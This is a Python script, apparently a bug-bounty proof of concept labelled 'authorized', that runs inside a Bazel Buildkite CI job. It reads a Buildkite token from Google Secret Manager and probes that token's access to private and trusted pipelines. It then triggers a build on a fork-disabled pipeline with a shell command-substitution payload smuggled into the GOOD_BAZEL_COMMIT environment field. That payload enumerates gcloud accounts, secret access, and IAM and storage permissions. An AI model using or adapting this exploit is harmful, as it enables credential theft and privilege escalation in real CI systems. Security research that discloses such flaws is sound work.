#!/usr/bin/env python3
"""Authorized synthetic probe for B-0244; never prints credential values."""

import json
import os
import subprocess
import sys
import urllib.error
import urllib.request


NONCE = "hi_from_robert:d21766e5488dc00f"
CANARY_COMMIT = os.environ.get("BUILDKITE_COMMIT", "HEAD")
CANARY_BRANCH = "benr00t3d:b0244-buildkite-scope-d21766e5488dc00f"
CANARY_PIPELINE = "culprit-finder"
CANARY_MESSAGE = "[authorized B-0244 mac IAM permissions canary] " + NONCE
API = "https://api.buildkite.com/v2"


def emit(result, visible=True):
    print("STABLE_B0244 " + result.get("state", "unknown"))
    if visible:
        print(
            "B0244_RESULT " + json.dumps(result, sort_keys=True, separators=(",", ":")),
            file=sys.stderr,
        )


def request(token, method, path, payload=None):
    body = None
    headers = {"Authorization": "Bearer " + token}
    if payload is not None:
        body = json.dumps(payload).encode("utf-8")
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(API + path, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=20) as response:
            raw = response.read()
            try:
                parsed = json.loads(raw) if raw else None
            except json.JSONDecodeError:
                parsed = {"text_response": True}
            return response.status, parsed
    except urllib.error.HTTPError as error:
        raw = error.read()
        try:
            parsed = json.loads(raw) if raw else None
        except json.JSONDecodeError:
            parsed = {"message": raw.decode("utf-8", "replace")[:200]}
        return error.code, parsed


def main():
    label = os.environ.get("BUILDKITE_LABEL", "")
    shard = os.environ.get("BUILDKITE_PARALLEL_JOB", "")
    if "Ubuntu 24.04 LTS (shard 1)" not in label or shard not in ("", "0"):
        emit({"nonce": NONCE, "state": "not-designated-job"}, visible=False)
        return

    job_id = os.environ.get("BUILDKITE_JOB_ID", "unknown")
    guard = "/tmp/b0244-" + job_id + ".done"
    try:
        descriptor = os.open(guard, os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o600)
        os.close(descriptor)
    except FileExistsError:
        emit({"nonce": NONCE, "state": "already-ran"})
        return

    result = {
        "nonce": NONCE,
        "state": "started",
        "build": os.environ.get("BUILDKITE_BUILD_NUMBER"),
        "job": job_id,
        "pipeline": os.environ.get("BUILDKITE_PIPELINE_SLUG"),
        "commit": os.environ.get("BUILDKITE_COMMIT"),
    }

    try:
        token = subprocess.check_output(
            [
                "gcloud",
                "secrets",
                "versions",
                "access",
                "latest",
                "--secret=bazel-bazelcipy-BuildkiteClient-token",
                "--project=bazel-untrusted",
            ],
            text=True,
            stderr=subprocess.DEVNULL,
            timeout=20,
        ).strip()
        result["secret_access"] = True

        status, token_info = request(token, "GET", "/access-token")
        result["access_token"] = {
            "status": status,
            "scopes": sorted(token_info.get("scopes", [])) if isinstance(token_info, dict) else [],
            "description": token_info.get("description") if isinstance(token_info, dict) else None,
            "created_at": token_info.get("created_at") if isinstance(token_info, dict) else None,
            "expires_at": token_info.get("expires_at") if isinstance(token_info, dict) else None,
        }

        probes = {
            "current_pipeline": "/organizations/bazel/pipelines/bazel-bazel-github-presubmit",
            "fork_disabled_pipeline": "/organizations/bazel/pipelines/" + CANARY_PIPELINE,
            "protected_downstream_pipeline": "/organizations/bazel/pipelines/bazel-at-head-plus-downstream",
            "private_buildfarm_admin": "/organizations/bazel/pipelines/buildfarm-admin-farmer",
            "private_sandboxed_api": "/organizations/bazel/pipelines/sandboxed-api",
            "trusted_publish_pipeline": "/organizations/bazel-trusted/pipelines/publish-bazel-binaries",
            "own_job_env": "/organizations/bazel/jobs/" + job_id + "/env",
            "own_job_artifacts": "/organizations/bazel/jobs/" + job_id + "/artifacts",
            "own_job_log": "/organizations/bazel/jobs/" + job_id + "/log",
        }
        result["reads"] = {}
        for name, path in probes.items():
            read_status, read_body = request(token, "GET", path)
            entry = {"status": read_status}
            if name == "own_job_env" and read_status == 200 and isinstance(read_body, dict):
                environment = read_body.get("env", read_body)
                if isinstance(environment, dict):
                    entry["keys"] = sorted(environment.keys())
            result["reads"][name] = entry

        org_status, orgs = request(token, "GET", "/organizations")
        org_slugs = {
            organization.get("slug")
            for organization in orgs
            if isinstance(organization, dict)
        } if isinstance(orgs, list) else set()
        result["organization_access"] = {
            "status": org_status,
            "count": len(org_slugs),
            "bazel": "bazel" in org_slugs,
            "bazel_trusted": "bazel-trusted" in org_slugs,
        }

        known_fork_disabled = (
            "rules-graalvm",
            "btwiuse-k0s",
            "tools-android",
            "subpar",
            "sandboxed-api",
            "buildfarm-admin-farmer",
            "bcsgh-utilities",
            "bcsgh-tbd",
            "bcsgh-stl-to-ps",
            "bcsgh-tbd-http",
            "bcsgh-bazel-rules",
        )
        result["known_fork_disabled_pipeline_status"] = {}
        for pipeline_slug in known_fork_disabled:
            pipeline_status, _ = request(
                token,
                "GET",
                "/organizations/bazel/pipelines/" + pipeline_slug,
            )
            result["known_fork_disabled_pipeline_status"][pipeline_slug] = pipeline_status

        payload = {
            "commit": CANARY_COMMIT,
            "branch": CANARY_BRANCH,
            "message": CANARY_MESSAGE,
            "clean_checkout": True,
            "ignore_pipeline_branch_filters": True,
            "pull_request_repository": "https://github.com/benr00t3d/bazel.git",
            "pull_request_id": "32668",
            "pull_request_base_branch": "master",
            "env": {
                "B0244_NONCE": NONCE,
                "PROJECT_NAME": "Bazel skylib",
                "TASK_NAME": "run_presubmit_bazel_9_config_01",
                "GOOD_BAZEL_COMMIT": (
                    "$( { "
                    "printf 'B0244_IAM_BEGIN hi_from_robert:d21766e5488dc00f\\n'; "
                    "printf 'active_account='; "
                    "gcloud auth list --filter=status:ACTIVE --format='value(account)' 2>&1 || true; "
                    "printf 'configured_project='; "
                    "gcloud config get project 2>&1 || true; "
                    "printf 'known_secret_access='; "
                    "if gcloud secrets versions access latest "
                    "--secret=bazel-bazelcipy-BuildkiteClient-token "
                    "--project=bazel-untrusted >/dev/null 2>&1; then echo yes; else echo no; fi; "
                    "printf 'project_permissions='; "
                    "curl --max-time 10 -fsS "
                    "-H \"Authorization: Bearer "
                    "$(gcloud auth print-access-token 2>/dev/null)\" "
                    "-H 'Content-Type: application/json' "
                    "--data '{\"permissions\":["
                    "\"resourcemanager.projects.get\","
                    "\"resourcemanager.projects.getIamPolicy\","
                    "\"resourcemanager.projects.setIamPolicy\","
                    "\"serviceusage.services.use\","
                    "\"secretmanager.secrets.list\","
                    "\"secretmanager.versions.access\","
                    "\"compute.instances.list\","
                    "\"compute.instances.create\","
                    "\"compute.instances.setServiceAccount\","
                    "\"iam.serviceAccounts.list\","
                    "\"iam.serviceAccounts.actAs\","
                    "\"iam.serviceAccounts.getAccessToken\","
                    "\"cloudbuild.builds.create\","
                    "\"artifactregistry.repositories.uploadArtifacts\","
                    "\"pubsub.topics.publish\","
                    "\"remotebuildexecution.actions.create\","
                    "\"remotebuildexecution.blobs.get\","
                    "\"remotebuildexecution.blobs.create\"]}' "
                    "https://cloudresourcemanager.googleapis.com/v1/projects/"
                    "bazel-untrusted:testIamPermissions || true; printf '\\n'; "
                    "printf 'bucket_permissions[bazel-untrusted-build-cache]='; "
                    "curl --max-time 10 -fsS -G "
                    "-H \"Authorization: Bearer "
                    "$(gcloud auth print-access-token 2>/dev/null)\" "
                    "--data-urlencode permissions=storage.buckets.get "
                    "--data-urlencode permissions=storage.objects.list "
                    "--data-urlencode permissions=storage.objects.get "
                    "--data-urlencode permissions=storage.objects.create "
                    "--data-urlencode permissions=storage.objects.delete "
                    "--data-urlencode permissions=storage.objects.update "
                    "https://storage.googleapis.com/storage/v1/b/"
                    "bazel-untrusted-build-cache/iam/testPermissions "
                    "|| true; printf '\\n'; "
                    "printf 'bucket_permissions[bazel-untrusted-last-green-commits]='; "
                    "curl --max-time 10 -fsS -G "
                    "-H \"Authorization: Bearer "
                    "$(gcloud auth print-access-token 2>/dev/null)\" "
                    "--data-urlencode permissions=storage.buckets.get "
                    "--data-urlencode permissions=storage.objects.list "
                    "--data-urlencode permissions=storage.objects.get "
                    "--data-urlencode permissions=storage.objects.create "
                    "--data-urlencode permissions=storage.objects.delete "
                    "--data-urlencode permissions=storage.objects.update "
                    "https://storage.googleapis.com/storage/v1/b/"
                    "bazel-untrusted-last-green-commits/iam/testPermissions "
                    "|| true; printf '\\n'; "
                    "printf 'bucket_permissions[bazel-builds]='; "
                    "curl --max-time 10 -fsS -G "
                    "-H \"Authorization: Bearer "
                    "$(gcloud auth print-access-token 2>/dev/null)\" "
                    "--data-urlencode permissions=storage.buckets.get "
                    "--data-urlencode permissions=storage.objects.list "
                    "--data-urlencode permissions=storage.objects.get "
                    "--data-urlencode permissions=storage.objects.create "
                    "--data-urlencode permissions=storage.objects.delete "
                    "--data-urlencode permissions=storage.objects.update "
                    "https://storage.googleapis.com/storage/v1/b/"
                    "bazel-builds/iam/testPermissions || true; printf '\\n'; "
                    "printf 'B0244_IAM_END\\n'; "
                    "} >&2; printf 'x --help')"
                ),
                "BAD_BAZEL_COMMIT": "HEAD",
            },
        }
        list_status, builds = request(
            token,
            "GET",
            "/organizations/bazel/pipelines/" + CANARY_PIPELINE + "/builds"
            + "?branch=" + CANARY_BRANCH + "&per_page=20",
        )
        existing = None
        if list_status == 200 and isinstance(builds, list):
            existing = next(
                (
                    build
                    for build in builds
                    if build.get("commit") == CANARY_COMMIT
                    or build.get("message") == payload["message"]
                ),
                None,
            )

        if existing is not None:
            build_status, build_body = 200, existing
            disposition = "reused"
        else:
            build_status, build_body = request(
                token,
                "POST",
                "/organizations/bazel/pipelines/" + CANARY_PIPELINE + "/builds",
                payload,
            )
            disposition = "created" if build_status == 201 else "rejected"

        result["canary_build"] = {
            "status": build_status,
            "list_status": list_status,
            "disposition": disposition,
        }
        if isinstance(build_body, dict):
            for field in ("number", "web_url", "state", "commit", "branch", "message"):
                if field in build_body:
                    result["canary_build"][field] = build_body[field]
            if build_status not in (200, 201):
                result["canary_build"]["error"] = build_body.get("message")
        result["state"] = "complete"
    except Exception as error:
        result["state"] = "error"
        result["error"] = type(error).__name__ + ": " + str(error)[:300]
    finally:
        if "token" in locals():
            token = ""

    emit(result)


if __name__ == "__main__":
    main()
